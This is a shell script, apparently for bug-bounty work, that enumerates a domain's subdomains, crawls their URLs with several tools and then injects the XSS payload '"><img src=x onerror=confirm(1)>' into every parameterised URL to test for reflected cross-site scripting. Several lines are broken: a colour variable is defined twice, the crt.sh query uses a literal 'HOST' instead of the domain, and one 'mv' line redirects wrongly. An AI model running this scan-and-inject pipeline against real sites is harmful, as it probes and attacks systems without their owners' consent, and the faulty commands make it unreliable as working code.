NA='\033[0m' # Text Reset

B='\033[1;30m' # Black 
R='\033[1;31m' # Red 
G='\033[1;32m' # Green 
Y='\033[1;33m' # Yellow 
B='\033[1;34m' # Blue 
P='\033[1;35m' # Purple 
C='\033[1;36m' # Cyan 

BWhite='\033[1;37m' # White



echo -e "${R} This is developed by Vijay Sutar ${NA}"

echo -ne "Enter the domain: $1 \n"

echo -e "${B} Subdomain Enumuration ${NA}"

echo -e "${R}"

subfinder -d $1 -silent | tee sub.txt

echo -e "${B} Sudomain from assetfinder ${NA}"

echo -e "${Y}"

assetfinder $1 | grep "$1" | tee -a sub.txt

echo -e "${B} Sudomain from Crt.sh ${NA}"

echo -e "${B}"

curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/*.//g' | sort -u | grep "$1" | tee -a sub.txt 


cat sub.txt | httpx -t 50 | tee subdomains.txt

echo -e "${B} Crawl urls from Gau ${NA}"

rm sub.txt

echo -e "${P}"

cat subdomains.txt | gau --fp --threads 300 --blacklist png,jpg,gif,pdf,jpeg,woff,woff2,tiff,tiff2 | tee urls.txt

#End of Gau

echo -e "${B} Crawl urls from Waybackurls ${NA}"


#echo -e "${C}"

#cat subdomains.txt | waybackurls | tee -a urls.txt

#End of Waybackurls



echo -e "${B} Crawl urls from Katana ${NA}"

echo -e "${R}"


cat subdomains.txt | httpx | katana -d 5 -c 50 -jc | tee -a urls.txt

#End of Katana

echo -e "${B} Crawl urls from Paramspider ${NA}"

echo -e "${R}"

pam.py -d $1 --level high 

cd output 

mv -v $1.txt /media/vijay/KALI-D/XSS


cd ..

mv $1.txt >> urls.txt
rm $1.txt 

rm -rf output


echo -e "${B} Run Hakcrawler ${NA}"

echo -e "${G}"

cat subdomains.txt | hakrawler -insecure -t 20 | tee -a urls.txt




echo -e "${R} Clean the urls ${NA}"

echo -e "${B}"


cat urls.txt | uro | uniq | sort -u | tee clean.txt

#cp clean.txt > $1_urls.txt



echo -e "${R} Filtered urls ${NA}"

echo -e "${P}"


rm urls.txt

cat clean.txt | grep "=" | httpx -t 100 | tee kxss.txt



echo -e "${R} Check for reflection ${NA}"


echo -e "${C}"


cat kxss.txt | grep "=" | kxss | tee -a xss.txt


echo -e "${R} Check for XSS ${NA}"


echo -e "${Y}"


cat kxss.txt | grep "=" | qsreplace '"><img src=x onerror=confirm(1)>' | rxss | tee -a rxss.txt

rm kxss.txt clean.txt subdomains.txt

